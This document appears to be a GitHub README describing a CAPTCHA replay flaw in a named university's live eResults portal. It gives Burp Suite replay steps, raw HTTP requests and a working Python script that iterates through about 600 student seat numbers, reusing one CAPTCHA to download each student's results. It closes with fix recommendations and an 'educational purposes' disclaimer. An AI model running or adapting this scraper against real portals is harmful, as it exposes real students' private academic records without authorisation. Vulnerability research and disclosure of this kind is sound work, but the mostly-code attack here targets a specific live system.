# 🐛 KLE Tech eResults CAPTCHA Bypass Exploit

## ⚠️ Vulnerability: Persistent CAPTCHA Token Allows Mass Data Scraping

### **Overview**
A security flaw in the [KLE Tech eResults](https://eresults.kletech.ac.in) portal allows **automated retrieval of student results** without solving multiple CAPTCHAs. The CAPTCHA token remains **unchanged when using the "Go Back" button**, allowing attackers to **reuse the same token** for multiple requests, effectively bypassing CAPTCHA validation.

This flaw enables **mass scraping of student records**, violating privacy regulations and exposing sensitive academic data.

---

## 🎯 **Vulnerability Type**
- **CAPTCHA Replay Attack**
- **Broken Authentication Mechanism**
- **Insecure Direct Object Reference (IDOR)**

---

## 🔍 **How the Exploit Works**
1. **Access the eResults page**, enter a valid **USN** (University Seat Number), and solve the CAPTCHA.
2. **Capture the request in Burp Suite** and note the **POST request** containing the CAPTCHA value.
3. **Navigate back in the browser** and input a **different USN**.
4. **Replay the Burp Suite request** with a modified **USN** while keeping the original CAPTCHA.
5. The server **accepts the request** and retrieves **new student results** without requiring a new CAPTCHA.

---

## 🔎 **Burp Suite Request & Response Analysis**

### 🔹 **Original Request**
```http
POST /index.php?option=com_examresult&task=getResult HTTP/1.1
Host: eresults.kletech.ac.in
Cookie: _ga_HLWRDTM589=GS1.1.1741269540.1.1.1741270344.0.0.0; _ga=GA1.3.2076330253.1741269541
Content-Length: 56
Origin: https://eresults.kletech.ac.in
Content-Type: application/x-www-form-urlencoded
Referer: https://eresults.kletech.ac.in/index.php
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Connection: keep-alive

usn=01fe22bcs110&osolCatchaTxt=REBLB&osolCatchaTxtInst=0
```

### 🔹 **Modified Request (Exploiting the Vulnerability)**
```http
POST /index.php?option=com_examresult&task=getResult HTTP/1.1
Host: eresults.kletech.ac.in
Cookie: _ga_HLWRDTM589=GS1.1.1741269540.1.1.1741270344.0.0.0; _ga=GA1.3.2076330253.1741269541
Content-Length: 56
Origin: https://eresults.kletech.ac.in
Content-Type: application/x-www-form-urlencoded
Referer: https://eresults.kletech.ac.in/index.php
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Connection: keep-alive

usn=01fe22bcs200&osolCatchaTxt=REBLB&osolCatchaTxtInst=0
```

### 🔹 **Server Response**
```html
<html>
  <body>
    <h3>Student Name: John Doe</h3>
    <table>
      <tr><td>Machine Learning</td><td>A</td></tr>
      <tr><td>Data Structures</td><td>B</td></tr>
    </table>
  </body>
</html>
```
📊 The **server accepts the same CAPTCHA** and returns **another student's results** without verification.

---

## 🤖 **Automating the Exploit**
We developed a Python script to:
1. **Solve CAPTCHA once** and save the token.
2. **Loop through all USNs** (`01fe22bcs001` → `01fe22bcs300`, `01fe22bci001` → `01fe22bci300`).
3. **Reuse the same CAPTCHA** for every request.
4. **Save each student's HTML response locally**.

### 👉 **Python Exploit Code**
```python
import requests

base_url = "https://eresults.kletech.ac.in/index.php"
session = requests.Session()

captcha_value = input("Enter CAPTCHA value: ").strip()
start_usn = 1
end_usn = 300

for series in ["01fe22bcs", "01fe22bci"]:
    for i in range(start_usn, end_usn + 1):
        usn = f"{series}{i:03d}"
        data = {
            "usn": usn,
            "osolCatchaTxt": captcha_value,
            "osolCatchaTxtInst": "0",
        }

        response = session.post(
            f"{base_url}?option=com_examresult&task=getResult",
            data=data
        )

        if "Wrong CAPTCHA" in response.text:
            print(f"❌ CAPTCHA expired. Try again.")
            break

        with open(f"{usn}.html", "w", encoding="utf-8") as file:
            file.write(response.text)

        print(f"✅ Saved: {usn}.html")
```

---

## 🛡 **How to Fix This?**
### 🔴 **Current Issue:**
- CAPTCHA is **not session-based** and can be reused.
- No per-request CAPTCHA verification.
- No rate-limiting or request throttling.

### 🛠 **Recommended Fixes:**
1. **Generate a new CAPTCHA** for every request.
2. **Tie the CAPTCHA token to a session** and expire it after a single use.
3. **Implement rate limiting** to block excessive requests from a single user.
4. **Use reCAPTCHA or a stronger CAPTCHA solution** to prevent automation.

---

## 🎯 **Impact**
- **Confidentiality Breach**: Any student's academic records can be accessed.
- **Privacy Violation**: Exposes personal academic information without authentication.
- **Regulatory Issues**: May violate data protection laws like **GDPR** and **Indian IT Act**.

---

## 💌 **Responsible Disclosure**
This report is for **educational purposes only**. If you are a security researcher or the system administrator of KLE Tech, we strongly recommend **fixing this vulnerability immediately**.

---

## ⚠️ **Disclaimer**
This repository is for **educational and ethical hacking research purposes only**. Unauthorized access to systems without permission is **illegal** and punishable by law. Do not misuse this information.

---

## 🔗 **References**
- [CAPTCHA Bypass Techniques](https://owasp.org/www-project-automated-threats-to-web-applications/)
- [OWASP IDOR (Insecure Direct Object Reference)](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference)

---

### 💪 Thanks for reading. Stay ethical! 🔒

